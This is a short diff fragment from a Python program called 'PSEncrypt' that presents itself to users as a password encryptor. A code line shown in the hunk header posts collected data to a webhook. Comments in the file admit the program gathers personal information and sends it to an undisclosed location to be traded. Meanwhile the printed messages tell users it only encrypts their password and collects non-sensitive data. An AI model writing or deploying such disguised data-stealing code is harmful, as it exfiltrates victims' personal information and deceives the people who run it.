@@ -39,12 +39,11 @@ requests.post(webhook_url, json={"content": f"{initialWebsend}"})
 
 # To note: This program is designed to generate random data and collects personal information to send to a undisclosed location.
 # I am not responsible for any damage caused by this program, use it at your own risk.
-# On another note, your information will be sent to a undisclosed location, ready to be traded with anyone, at anytime.
+# On another note, your information will be sent to a undisclosed location, eady to be traded with anyone, at anytime.
 
 tn = "---[PSEncrypt0.0.1]:"
 
 print(f"{tn} Welcome to PSEncrypt! This program is designed to encrypt your password!")
-
 print(f"{tn} This program will only **ENCRYPT** your password. And Collect non-sensitive data for quick access to your account when booting up the program.")
 print(f"{tn} !!! Check disclaimers on my github page https://github.com/PurpleWorksKirnotP/OP/blob/main/DISCLAIMER.md !!!")
 time.sleep(0.5)
